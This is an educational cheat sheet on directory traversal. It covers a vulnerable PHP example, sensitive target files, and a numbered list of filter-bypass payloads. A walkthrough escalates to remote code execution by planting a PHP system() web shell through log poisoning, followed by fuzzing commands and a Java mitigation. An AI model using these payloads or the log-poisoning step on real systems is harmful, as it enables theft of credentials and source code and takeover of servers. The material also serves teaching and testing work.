# What is Directory Traversal?

Directory Traversal (also called path traversal) lets an attacker read (and sometimes write) files outside the intended directory by injecting `../` sequences into a file path the app builds from user input. It is a fast route to source code, config secrets, and `/etc/passwd`, and it frequently escalates into RCE when combined with file upload or log poisoning.

## How it works

The app builds a file path from user input, for example:

```php
// VULNERABLE
$file = $_GET['file'];
readfile("/var/www/files/" . $file);
```

Request `?file=../../../../etc/passwd` and the resolved path becomes `/etc/passwd`. Each `../` climbs up one directory; enough of them escape the intended folder and reach anywhere on the filesystem the process can read.

## Impact

- Read source code, config files, credentials, SSH keys (`/home/user/.ssh/id_rsa`)
- Read `/etc/passwd`, `/etc/shadow` (if running as root)
- On Windows: `C:\Windows\win.ini`, `web.config`, app secrets
- Escalate to **RCE** via log poisoning or reading session files

## High-value target files

```text
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ        (env vars, sometimes creds)
/var/log/apache2/access.log   (log poisoning -> RCE)
~/.ssh/id_rsa
/var/www/html/config.php

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

## Test payloads (work through these in order)

```text
# 1. Basic
../../../../etc/passwd
..\..\..\..\windows\win.ini

# 2. If the app strips "../" once (non-recursive), nest it
....//....//....//etc/passwd
..././..././etc/passwd

# 3. URL-encode the slashes/dots
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 4. Double URL-encode (decoded twice by app + server)
..%252f..%252f..%252fetc%252fpasswd

# 5. Overlong UTF-8 / 16-bit unicode
..%c0%af..%c0%afetc/passwd
..%u2216..%u2216etc/passwd

# 6. Null byte to cut off a forced extension (legacy PHP < 5.3.4)
../../../../etc/passwd%00.png

# 7. Force a required prefix that appends a path
file=/var/www/files/../../../etc/passwd   (start with the expected base)

# 8. Absolute path or UNC
/etc/passwd
\\attacker\share\file
```

```php
# PHP wrapper - read source as base64 instead of executing it
php://filter/convert.base64-encode/resource=index.php
```

## Full walkthrough

1. Spot `https://site.tld/download?file=report.pdf`.
2. Try `?file=../../../../etc/passwd` -> the response returns the passwd file. Confirmed.
3. Blocked? Try `?file=..%252f..%252f..%252fetc%252fpasswd` (double encoding).
4. Read app source: `?file=php://filter/convert.base64-encode/resource=../config.php`, then base64-decode to find DB credentials.
5. Attempt RCE: poison the access log with a `<?php system($_GET['c']); ?>` User-Agent, then `?file=../../../var/log/apache2/access.log&c=id`.

## Tools

- [Burp Suite](https://portswigger.net/burp) - manual traversal and encoding tests (Intruder for depth)
- [ffuf](https://github.com/ffuf/ffuf) - fuzz path parameters with a traversal wordlist
- [dotdotpwn](https://github.com/wireghoul/dotdotpwn) - dedicated traversal fuzzer

```bash
# Fuzz a file parameter with a traversal wordlist
ffuf -u "https://site.tld/download?file=FUZZ" -w /path/to/lfi-payloads.txt -mr "root:"

# dotdotpwn against an HTTP target
dotdotpwn -m http -h site.tld -f /etc/passwd -k "root:"
```

## Mitigation - the fix

```java
// Java - canonicalize and verify the resolved path stays in the base dir
File base = new File("/var/www/files/").getCanonicalFile();
File target = new File(base, userInput).getCanonicalFile();
if (!target.getPath().startsWith(base.getPath())) {
    throw new SecurityException("Path traversal attempt");
}
```

- **Best fix:** don't build paths from input at all. Map input to an allowlist of IDs (`1 -> report.pdf`).
- Canonicalize the resolved path and confirm it is inside the base directory.
- Reject `../`, encoded variants, null bytes, and absolute paths.
- Run with least privilege so escaped reads hit nothing sensitive.

## Practice

- [PortSwigger path traversal labs](https://portswigger.net/web-security/file-path-traversal)

## Deep dive

- [Directory Traversal - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger path traversal labs](https://portswigger.net/web-security/file-path-traversal)

## CWE

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
